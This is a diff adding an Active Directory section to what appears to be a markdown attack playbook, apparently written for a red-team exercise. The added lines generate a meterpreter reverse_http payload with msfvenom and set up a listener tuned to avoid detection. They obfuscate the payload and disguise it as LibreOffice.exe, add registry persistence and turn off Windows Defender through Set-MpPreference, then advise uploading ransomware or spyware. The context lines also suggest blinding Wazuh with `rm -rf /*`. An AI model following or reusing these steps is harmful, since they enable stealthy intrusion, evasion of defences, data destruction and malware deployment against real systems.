@@ -63,4 +63,37 @@ Paste the result in your python `fermat.py` as the argument of the `factorize()`
 Once logged in, make Wazuh blind. Use any method you can think of (e.g. changing ip address, stopping the service, `rm -rf /*`...)
 
 # Active Directory
-Upload a custom C2 to avoid leaving IoCs.
+Upload a custom C2 to avoid leaving IoCs. Use an obfusated `meterpreter` and upload it via `scp -r` to the `Domain Controller`.\
+`msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.0.0.6 LPORT=80 -f csharp`
+Encrypt the payload with `xor_payload` then obfuscate it with `payload`. Rename it to a more conventional name (e.g. LibreOffice.exe, Chromium.exe...).\
+Setup a meterpreter listener:\
+```
+msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_http
+set lhost 10.0.0.6
+set lport 80
+# avoiding IoCs
+set AutoLoadStdapi false
+set AutoSystemInfo false
+# opportunity to get more than 1 listener
+set ReverseListenerThreaded true
+exploit
+```
+With a **SSH** session, upload then launch the program (use several session if possible). Once a meterpreter session opened, execute the following:
+```
+# persistance (adapt to a more stealthy location)
+reg setval -k 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run' -t REG_SZ -v 'LibreOffice' -d 'C:\Users\Administrator\Desktop\LibreOffice.exe'
+# use a shell (wait at least a minute to be even more stealthy!)
+load stdapi
+shell
+# create an AV exception
+Add-MpPreference -ExclusionPath "C:\Users\Administrator\Desktop"
+# Disable AV
+Set-MpPreference -DisableTamperProtection $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -MAPSReporting 0
+​Set-MpPreference -SubmitSamplesConsent NeverSend
+```
+
+Upload any file (e.g. ransomware, spyware...) after disabling the controls with the meterpreter shell with `upload <path/to/file>`
